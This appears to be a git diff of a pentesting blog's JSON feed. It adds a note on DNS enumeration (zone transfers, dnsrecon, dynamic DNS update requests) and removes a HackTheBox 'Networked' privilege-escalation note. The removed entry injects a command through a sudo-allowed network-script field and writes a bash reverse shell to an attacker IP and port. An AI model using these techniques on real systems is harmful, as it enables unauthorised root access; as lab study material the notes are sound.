@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/05/01/dns-domain-name-system",
+            "title": "DNS (Domain Name System)",
+            "summary": "DNS (Domain Name System)",
+            "content_text": "Interesting Files# bind key/etc/bind/ddns.keyCommands# interactivenslookup&gt; server 10.10.10.161[...redacted...]&gt; 127.0.0.1           # lookup localhost[...redacted...]&gt; 127.0.0.2           # some systems have this[...redacted...]&gt; 10.10.10.161        # lookup its ip[...redacted...]Zone Transfer  Usually you can do this if DNS is running via TCP instead of UDP  You need a domain name in order for this to work  You can have clues on how many domains it holds based from failed transfer output$ dig axfr @mantis                  [...redacted...]; (1 server found)[...redacted...]$Reverse DNS# Checks loopback addresses - looks like command is no longer# validdnsrecon -n 10.10.10.83 -r 10.0.0.0/8 --db olympus.dbdnsrecon -n 10.10.10.83 -r 172.16.0.0/12 --db olympus.dbdnsrecon -n 10.10.10.83 -r 192.168.0.0/16 --db olympus.dbDynamic DNS (no-ip)# adding record setting a specific IPcurl 'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb&amp;myip=10.10.14.45'# adding a record using IP by clientcurl 'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb'  DDNS server implementations          php      php 2      perl      golang        API                                                      [Perform Update (RA-API)              Dyn Help Center](https://help.dyn.com/remote-access-api/perform-update/)                                          Tools  GitHub - hash3liZer/Subrake: A Subdomain Enumeration and Validation tool for Bug Bounty and Pentesters.References  53 - Pentesting DNS - HackTricks f",
+            "content_html": "<h2 id=\"interesting-files\">Interesting Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># bind key</span>/etc/bind/ddns.key</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># interactive</span>nslookup<span class=\"o\">&gt;</span> server 10.10.10.161<span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 127.0.0.1           <span class=\"c\"># lookup localhost</span><span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 127.0.0.2           <span class=\"c\"># some systems have this</span><span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 10.10.10.161        <span class=\"c\"># lookup its ip</span><span class=\"o\">[</span>...redacted...]</code></pre></div></div><h2 id=\"zone-transfer\">Zone Transfer</h2><ul>  <li>Usually you can do this if DNS is running via TCP instead of UDP</li>  <li>You need a domain name in order for this to work</li>  <li>You can have clues on how many domains it holds based from failed transfer output</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>dig axfr @mantis                  <span class=\"o\">[</span>...redacted...]<span class=\"p\">;</span> <span class=\"o\">(</span>1 server found<span class=\"o\">)</span><span class=\"o\">[</span>...redacted...]<span class=\"err\">$</span></code></pre></div></div><h2 id=\"reverse-dns\">Reverse DNS</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Checks loopback addresses - looks like command is no longer</span><span class=\"c\"># valid</span>dnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 10.0.0.0/8 <span class=\"nt\">--db</span> olympus.dbdnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 172.16.0.0/12 <span class=\"nt\">--db</span> olympus.dbdnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 192.168.0.0/16 <span class=\"nt\">--db</span> olympus.db</code></pre></div></div><h2 id=\"dynamic-dns-no-ip\">Dynamic DNS (no-ip)</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># adding record setting a specific IP</span>curl <span class=\"s1\">'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb&amp;myip=10.10.14.45'</span><span class=\"c\"># adding a record using IP by client</span>curl <span class=\"s1\">'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb'</span></code></pre></div></div><ul>  <li>DDNS server implementations    <ul>      <li><a href=\"https://www.yingtongli.me/blog/2017/04/18/dynamic-dns.html\">php</a></li>      <li><a href=\"https://github.com/kbabioch/php-ddns/blob/master/update.php\">php 2</a></li>      <li><a href=\"https://github.com/randomnoun/ddserver\">perl</a></li>      <li><a href=\"https://github.com/benjaminbear/docker-ddns-server\">golang</a></li>    </ul>  </li>  <li>API    <ul>      <li>        <table>          <tbody>            <tr>              <td>[Perform Update (RA-API)</td>              <td>Dyn Help Center](https://help.dyn.com/remote-access-api/perform-update/)</td>            </tr>          </tbody>        </table>      </li>    </ul>  </li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/hash3liZer/Subrake\">GitHub - hash3liZer/Subrake: A Subdomain Enumeration and Validation tool for Bug Bounty and Pentesters.</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-dns\">53 - Pentesting DNS - HackTricks</a> f</li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/05/01/dns-domain-name-system",
+            
+            
+            
+            "tags": ["enum","dns","network"],
+            
+            "date_published": "2022-05-01T00:00:00+08:00",
+            "date_modified": "2022-05-01T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/04/30/ad-recycle-bin",
             "title": "AD Recycle Bin",
             "summary": "AD Recycle Bin",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-02-23T00:00:00+08:00",
             "date_modified": "2022-02-23T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/02/22/network-scripts-command-injection",
-            "title": "Network Scripts Command Injection",
-            "summary": "Network Scripts Command Injection",
-            "content_text": "OverviewAttacker can do privesc if user has sudo permissions to create or modify ifcfg-&lt;DEVICE_NAME&gt; under /etc/sysconfig/network-scriptsEnvironment Setup and Requirements  Sudo permissionsUser guly may run the following commands on networked:    (root) NOPASSWD: /usr/local/sbin/changename.sh  Script content#!/bin/bash -pcat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=\"^[a-zA-Z0-9_\\ /-]+$\"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do\techo \"interface $var:\"\tread x\twhile [[ ! $x =~ $regexp ]]; do\t\techo \"wrong input, try again\"\t\techo \"interface $var:\"\t\tread x\tdone\techo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-gulydone  /sbin/ifup guly0Steps  Create your malicuous scriptecho 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1' &gt; /home/guly/evil  Open netcat listener on attacker machine  Run script using sudo and enjoy[guly@networked ~]$ sudo /usr/local/sbin/changename.shinterface NAME:guly0 /home/guly/evil[...redacted...]References  Linux Privilege Escalation - HackTricks  HackTheBox - Networked",
-            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can do privesc if user has sudo permissions to create or modify <code class=\"language-plaintext highlighter-rouge\">ifcfg-&lt;DEVICE_NAME&gt;</code> under <code class=\"language-plaintext highlighter-rouge\">/etc/sysconfig/network-scripts</code></p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>Sudo permissions</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>User guly may run the following commands on networked:    (root) NOPASSWD: /usr/local/sbin/changename.sh</code></pre></div></div><ul>  <li>Script content</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">#!/bin/bash -p</span><span class=\"nb\">cat</span> <span class=\"o\">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class=\"o\">&lt;&lt;</span> <span class=\"no\">EoF</span><span class=\"sh\">DEVICE=guly0ONBOOT=noNM_CONTROLLED=no</span><span class=\"no\">EoF</span><span class=\"nv\">regexp</span><span class=\"o\">=</span><span class=\"s2\">\"^[a-zA-Z0-9_</span><span class=\"se\">\\ </span><span class=\"s2\">/-]+$\"</span><span class=\"k\">for </span>var <span class=\"k\">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class=\"p\">;</span> <span class=\"k\">do\t</span><span class=\"nb\">echo</span> <span class=\"s2\">\"interface </span><span class=\"nv\">$var</span><span class=\"s2\">:\"</span>\t<span class=\"nb\">read </span>x\t<span class=\"k\">while</span> <span class=\"o\">[[</span> <span class=\"o\">!</span> <span class=\"nv\">$x</span> <span class=\"o\">=</span>~ <span class=\"nv\">$regexp</span> <span class=\"o\">]]</span><span class=\"p\">;</span> <span class=\"k\">do\t\t</span><span class=\"nb\">echo</span> <span class=\"s2\">\"wrong input, try again\"</span>\t\t<span class=\"nb\">echo</span> <span class=\"s2\">\"interface </span><span class=\"nv\">$var</span><span class=\"s2\">:\"</span>\t\t<span class=\"nb\">read </span>x\t<span class=\"k\">done\t</span><span class=\"nb\">echo</span> <span class=\"nv\">$var</span><span class=\"o\">=</span><span class=\"nv\">$x</span> <span class=\"o\">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly<span class=\"k\">done</span>  /sbin/ifup guly0</code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Create your malicuous script</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s1\">'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'</span> <span class=\"o\">&gt;</span> /home/guly/evil</code></pre></div></div><ul>  <li>Open netcat listener on attacker machine</li>  <li>Run script using sudo and enjoy</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[</span>guly@networked ~]<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> /usr/local/sbin/changename.shinterface NAME:guly0 /home/guly/evil<span class=\"o\">[</span>...redacted...]</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-sysconfig-network-scripts-centos-redhat\">Linux Privilege Escalation - HackTricks</a></li>  <li><a href=\"https://www.youtube.com/watch?v=H3t3G70bakM\">HackTheBox - Networked</a></li></ul>",
-            "url": "https://mvineza.github.io/spindel/2022/02/22/network-scripts-command-injection",
-            
-            
-            
-            "tags": ["linux","privesc","networking"],
-            
-            "date_published": "2022-02-22T00:00:00+08:00",
-            "date_modified": "2022-02-22T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
